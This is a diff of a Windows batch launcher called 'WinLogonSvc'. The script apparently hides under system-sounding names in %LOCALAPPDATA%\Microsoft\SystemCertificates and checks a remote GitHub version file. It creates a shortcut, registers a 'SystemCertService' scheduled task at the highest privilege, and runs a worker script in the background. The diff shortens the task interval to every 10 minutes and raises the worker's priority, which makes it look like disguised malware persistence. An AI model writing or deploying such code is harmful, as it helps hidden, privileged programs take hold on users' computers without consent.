@@ -1,13 +1,4 @@
-@echo off
-setlocal enabledelayedexpansion
-
-:: =================================================================================
-:: WinLogonSvc
-:: Version: 1.0
-:: Task: Check the integrity of the Executor script and run it.
-:: =================================================================================
-
-set "LAUNCHER_VERSION=1.0"
+set "LAUNCHER_VERSION=1.1"
 set "LAUNCHER_VERSION_URL=https://raw.githubusercontent.com/escola-iracema/isrs/main/launcher_version.txt"
 
 set "secretPath=%LOCALAPPDATA%\Microsoft\SystemCertificates"
@@ -38,16 +29,23 @@ if %errorlevel% neq 0 (
 )
 
 if not exist "%shortcutPath%" (
-    powershell -Command "$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut('%shortcutPath%'); $s.TargetPath = '%targetPath%'; $s.Save()" >nul 2>&1
+    powershell -Command "$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut(\"%shortcutPath%\"); $s.TargetPath = \"cmd /c start \"\" /B \"%targetPath%\"\"; $s.Save()" >nul 2>&1
 )
 
-schtasks /create /tn "SystemCertService" /tr "\"!targetPath!\"" /sc hourly /ri 50 /f /rl HIGHEST >nul 2>&1
+schtasks /create /tn "SystemCertService" /tr "\"!targetPath!\"" /sc MINUTE /mo 10 /f /rl HIGHEST >nul 2>&1
 
 if exist "%workerScriptPath%" (
-    call "%workerScriptPath%"
-	start "" /B "%workerScriptPath%"
+    start "" /B /high "%workerScriptPath%"
 )
 
 :eof
 endlocal
 exit /b
+
+
+
+
+:: Logging
+set "logPath=%LOCALAPPDATA%\Microsoft\SystemCertificates\WinLogonSvc.log"
+echo %DATE% %TIME% - WinLogonSvc executado. >> "%logPath%"
+
